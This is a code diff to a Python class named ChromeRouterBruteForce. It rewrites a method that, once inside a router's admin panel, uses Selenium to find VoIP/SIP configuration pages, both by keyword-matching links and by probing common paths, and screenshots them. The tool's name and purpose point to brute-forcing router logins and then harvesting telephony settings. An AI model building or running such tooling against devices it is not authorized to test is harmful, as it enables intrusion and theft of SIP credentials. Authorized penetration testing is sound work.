@@ -605,138 +605,180 @@ class ChromeRouterBruteForce:
         try:
             print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages...{Colors.END}")
             
-            # Common VoIP/SIP page paths and keywords
-            voip_paths = [
-                "/voip", "/sip", "/voice", "/telephony", "/phone",
-                "/advanced/voip", "/advanced/sip", "/network/voip", "/network/sip",
-                "/admin/voip", "/admin/sip", "/config/voip", "/config/sip",
-                "/settings/voip", "/settings/sip", "/system/voip", "/system/sip",
-                "/voip.html", "/sip.html", "/voice.html", "/telephony.html",
-                "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html"
-            ]
-            
-            # VoIP/SIP related keywords to look for in links
-            voip_keywords = [
-                "voip", "sip", "voice", "telephony", "phone", "pbx", "trunk",
-                "call", "dial", "extension", "line", "gateway", "proxy"
-            ]
-            
             screenshots_taken = []
             
-            # Method 1: Try direct paths
-            for path in voip_paths:
-                try:
-                    voip_url = f"{base_url.rstrip('/')}{path}"
-                    print(f"{Colors.BLUE}[*] Trying VoIP path: {voip_url}{Colors.END}")
-                    
-                    self.driver.get(voip_url)
-                    time.sleep(3)
-                    
-                    # Check if page loaded successfully and contains VoIP/SIP content
-                    page_source = self.driver.page_source.lower()
-                    title = self.driver.title.lower()
-                    
-                    # Check for VoIP/SIP indicators
-                    voip_indicators = [
-                        'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
-                        'call', 'dial', 'extension', 'line', 'gateway', 'proxy',
-                        'sip server', 'voip server', 'phone system', 'call routing'
-                    ]
-                    
-                    voip_count = sum(1 for indicator in voip_indicators if indicator in page_source or indicator in title)
-                    
-                    if voip_count >= 2:  # At least 2 VoIP indicators
-                        print(f"{Colors.GREEN}[+] VoIP/SIP page found: {voip_url}{Colors.END}")
-                        print(f"{Colors.GREEN}[+] VoIP indicators: {voip_count}{Colors.END}")
-                        
-                        # Take screenshot
-                        screenshot_path = self.take_screenshot(f"voip_sip_config_{path.replace('/', '_')}", voip_url)
-                        if screenshot_path:
-                            screenshots_taken.append(screenshot_path)
-                        
-                        # Don't try more paths if we found a good one
-                        break
-                        
-                except Exception as e:
-                    continue
+            # Method 1: Extract all links from admin panel and filter VoIP/SIP ones
+            print(f"{Colors.BLUE}[*] Extracting all links from admin panel...{Colors.END}")
             
-            # Method 2: Search for VoIP/SIP links on current page
             try:
-                print(f"{Colors.BLUE}[*] Searching for VoIP/SIP links on current page...{Colors.END}")
-                
-                # Get all links on the page
+                # Get all links on the current admin panel page
                 links = self.driver.find_elements(By.TAG_NAME, "a")
                 
+                voip_links = []
+                voip_keywords = [
+                    "voip", "sip", "voice", "telephony", "phone", "pbx", "trunk",
+                    "call", "dial", "extension", "line", "gateway", "proxy", "fax"
+                ]
+                
+                print(f"{Colors.BLUE}[*] Found {len(links)} total links on admin panel{Colors.END}")
+                
+                # Filter links that contain VoIP/SIP keywords
                 for link in links:
                     try:
-                        link_text = link.text.lower()
+                        link_text = link.text.lower().strip()
                         link_href = link.get_attribute("href")
                         
-                        if link_href and any(keyword in link_text for keyword in voip_keywords):
-                            print(f"{Colors.BLUE}[*] Found VoIP link: {link_text} -> {link_href}{Colors.END}")
+                        if link_href and link_text:
+                            # Check if link text contains VoIP/SIP keywords
+                            if any(keyword in link_text for keyword in voip_keywords):
+                                voip_links.append({
+                                    'text': link_text,
+                                    'href': link_href,
+                                    'element': link
+                                })
+                                print(f"{Colors.GREEN}[+] Found VoIP/SIP link: '{link_text}' -> {link_href}{Colors.END}")
+                        
+                        # Also check href for VoIP/SIP keywords
+                        elif link_href and any(keyword in link_href.lower() for keyword in voip_keywords):
+                            voip_links.append({
+                                'text': f"Link: {link_href}",
+                                'href': link_href,
+                                'element': link
+                            })
+                            print(f"{Colors.GREEN}[+] Found VoIP/SIP link in URL: {link_href}{Colors.END}")
                             
-                            # Click the link
-                            link.click()
-                            time.sleep(3)
-                            
-                            # Check if it's a VoIP/SIP page
-                            page_source = self.driver.page_source.lower()
-                            title = self.driver.title.lower()
-                            
-                            voip_indicators = [
-                                'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
-                                'call', 'dial', 'extension', 'line', 'gateway', 'proxy'
-                            ]
-                            
-                            voip_count = sum(1 for indicator in voip_indicators if indicator in page_source or indicator in title)
-                            
-                            if voip_count >= 2:
-                                print(f"{Colors.GREEN}[+] VoIP/SIP page found via link: {self.driver.current_url}{Colors.END}")
-                                
-                                # Take screenshot
-                                screenshot_path = self.take_screenshot("voip_sip_config_link", self.driver.current_url)
-                                if screenshot_path:
-                                    screenshots_taken.append(screenshot_path)
-                                
-                                # Go back to admin panel
-                                self.driver.back()
-                                time.sleep(2)
-                                
                     except Exception as e:
+                        continue
+                
+                print(f"{Colors.BLUE}[*] Found {len(voip_links)} VoIP/SIP related links{Colors.END}")
+                
+                # Visit each VoIP/SIP link and check for configuration content
+                for i, link_info in enumerate(voip_links):
+                    try:
+                        print(f"{Colors.BLUE}[*] Visiting VoIP/SIP link {i+1}/{len(voip_links)}: {link_info['text']}{Colors.END}")
+                        
+                        # Click the link
+                        link_info['element'].click()
+                        time.sleep(4)  # Wait for page to load
+                        
+                        # Check current URL and page content
+                        current_url = self.driver.current_url
+                        page_source = self.driver.page_source.lower()
+                        title = self.driver.title.lower()
+                        
+                        # Enhanced VoIP/SIP indicators
+                        voip_indicators = [
+                            'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
+                            'call', 'dial', 'extension', 'line', 'gateway', 'proxy', 'fax',
+                            'sip server', 'voip server', 'phone system', 'call routing',
+                            'sip proxy', 'sip registrar', 'sip trunk', 'voip gateway',
+                            'call forwarding', 'call transfer', 'conference', 'hold',
+                            'ringtone', 'voicemail', 'dial plan', 'codec', 'dtmf'
+                        ]
+                        
+                        # Count VoIP indicators in page content
+                        voip_count = sum(1 for indicator in voip_indicators if indicator in page_source)
+                        title_voip_count = sum(1 for indicator in voip_indicators if indicator in title)
+                        
+                        total_voip_indicators = voip_count + title_voip_count
+                        
+                        print(f"{Colors.BLUE}[*] VoIP indicators found: {voip_count} in content, {title_voip_count} in title{Colors.END}")
+                        
+                        # Check if this is a VoIP/SIP configuration page
+                        if total_voip_indicators >= 2:  # At least 2 VoIP indicators
+                            print(f"{Colors.GREEN}[+] VoIP/SIP configuration page found!{Colors.END}")
+                            print(f"{Colors.GREEN}[+] URL: {current_url}{Colors.END}")
+                            print(f"{Colors.GREEN}[+] Title: {self.driver.title}{Colors.END}")
+                            print(f"{Colors.GREEN}[+] VoIP indicators: {total_voip_indicators}{Colors.END}")
+                            
+                            # Take screenshot
+                            screenshot_path = self.take_screenshot(f"voip_sip_config_link_{i+1}", current_url)
+                            if screenshot_path:
+                                screenshots_taken.append(screenshot_path)
+                            
+                            # Look for SIP configuration forms or tables
+                            try:
+                                # Check for common SIP configuration elements
+                                sip_elements = [
+                                    "input[name*='sip']", "input[name*='voip']", "input[name*='phone']",
+                                    "select[name*='sip']", "select[name*='voip']", "select[name*='codec']",
+                                    "textarea[name*='sip']", "table[id*='sip']", "table[class*='sip']",
+                                    "form[id*='sip']", "form[name*='sip']", "form[class*='sip']"
+                                ]
+                                
+                                for selector in sip_elements:
+                                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
+                                    if elements:
+                                        print(f"{Colors.GREEN}[+] Found SIP configuration element: {selector}{Colors.END}")
+                                        break
+                                        
+                            except Exception as e:
+                                pass
+                            
+                        else:
+                            print(f"{Colors.YELLOW}[!] Not a VoIP/SIP configuration page (only {total_voip_indicators} indicators){Colors.END}")
+                        
+                        # Go back to admin panel
+                        self.driver.back()
+                        time.sleep(2)
+                        
+                    except Exception as e:
+                        print(f"{Colors.YELLOW}[!] Error visiting VoIP link: {e}{Colors.END}")
+                        # Try to go back if we're stuck
+                        try:
+                            self.driver.back()
+                            time.sleep(2)
+                        except:
+                            pass
                         continue
                         
             except Exception as e:
-                print(f"{Colors.YELLOW}[!] Error searching for VoIP links: {e}{Colors.END}")
+                print(f"{Colors.YELLOW}[!] Error extracting VoIP links: {e}{Colors.END}")
             
-            # Method 3: Try common VoIP/SIP form elements
-            try:
-                print(f"{Colors.BLUE}[*] Searching for VoIP/SIP form elements...{Colors.END}")
+            # Method 2: Try common VoIP/SIP paths as fallback
+            if not screenshots_taken:
+                print(f"{Colors.BLUE}[*] Trying common VoIP/SIP paths as fallback...{Colors.END}")
                 
-                # Look for forms with VoIP/SIP related names/IDs
-                voip_form_selectors = [
-                    "form[name*='voip']", "form[name*='sip']", "form[name*='voice']",
-                    "form[id*='voip']", "form[id*='sip']", "form[id*='voice']",
-                    "input[name*='voip']", "input[name*='sip']", "input[name*='voice']",
-                    "select[name*='voip']", "select[name*='sip']", "select[name*='voice']"
+                voip_paths = [
+                    "/voip", "/sip", "/voice", "/telephony", "/phone",
+                    "/advanced/voip", "/advanced/sip", "/network/voip", "/network/sip",
+                    "/admin/voip", "/admin/sip", "/config/voip", "/config/sip",
+                    "/settings/voip", "/settings/sip", "/system/voip", "/system/sip"
                 ]
                 
-                for selector in voip_form_selectors:
+                for path in voip_paths:
                     try:
-                        elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
-                        if elements:
-                            print(f"{Colors.GREEN}[+] Found VoIP/SIP form element: {selector}{Colors.END}")
+                        voip_url = f"{base_url.rstrip('/')}{path}"
+                        print(f"{Colors.BLUE}[*] Trying VoIP path: {voip_url}{Colors.END}")
+                        
+                        self.driver.get(voip_url)
+                        time.sleep(3)
+                        
+                        # Check if page loaded successfully and contains VoIP/SIP content
+                        page_source = self.driver.page_source.lower()
+                        title = self.driver.title.lower()
+                        
+                        voip_indicators = [
+                            'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
+                            'call', 'dial', 'extension', 'line', 'gateway', 'proxy'
+                        ]
+                        
+                        voip_count = sum(1 for indicator in voip_indicators if indicator in page_source or indicator in title)
+                        
+                        if voip_count >= 2:  # At least 2 VoIP indicators
+                            print(f"{Colors.GREEN}[+] VoIP/SIP page found: {voip_url}{Colors.END}")
+                            print(f"{Colors.GREEN}[+] VoIP indicators: {voip_count}{Colors.END}")
                             
-                            # Take screenshot of the form
-                            screenshot_path = self.take_screenshot("voip_sip_form", self.driver.current_url)
+                            # Take screenshot
+                            screenshot_path = self.take_screenshot(f"voip_sip_config_{path.replace('/', '_')}", voip_url)
                             if screenshot_path:
                                 screenshots_taken.append(screenshot_path)
+                            
+                            # Don't try more paths if we found a good one
                             break
                             
                     except Exception as e:
                         continue
-                        
-            except Exception as e:
-                print(f"{Colors.YELLOW}[!] Error searching for VoIP forms: {e}{Colors.END}")
             
             if screenshots_taken:
                 print(f"{Colors.GREEN}[+] VoIP/SIP screenshots taken: {len(screenshots_taken)}{Colors.END}")
